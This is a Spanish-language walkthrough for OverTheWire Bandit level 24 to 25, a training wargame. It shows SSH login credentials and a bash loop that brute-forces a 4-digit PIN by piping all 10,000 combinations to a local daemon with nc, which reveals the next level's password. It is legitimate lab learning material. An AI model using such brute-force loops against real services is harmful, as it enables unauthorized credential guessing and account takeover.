# Bandit
# Level 24 a 25
## Objetivo
Un demonio está escuchando en el puerto 30002 y le dará la contraseña de bandit25 si se le proporciona la contraseña de bandit25 si se le proporciona la contraseña de bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código PIN, excepto pasando por todas las 10000 combinaciones, lo que se conoce como fuerza bruta.

## Datos de acceso
Username: bandit24
Contraseña: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
Puerto: 2220
Host:  bandit.labs.overthewire.org

## Solución
 ```shell
ssh bandit24@bandit.labs.overthewire.org -p 2220
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
Fail! You did not supply enough data. Try again.
bandit24@bandit:~$ echo {0000..0005}
0000 0001 0002 0003 0004 0005
bandit24@bandit:~$ for i in {0000..0005}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0001
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0002
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0003
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0004
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0005
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$

```
 
## Notas adicionales
Se crea un for que entra a las combinaciones del 0000 al 999, a cada uno le introduce la contraseña del nivel 24, también los conecta con `localhost` 30002, y con ayuda del comando `grep` podemos encontrar  coincidencias, es decir, encontrar una palabra o combinación de palabras dentro de un fichero.
 
## Referencias
- [Uso de grep](https://keepcoding.io/blog/que-es-el-comando-grep-y-como-usarlo-en-linux/)
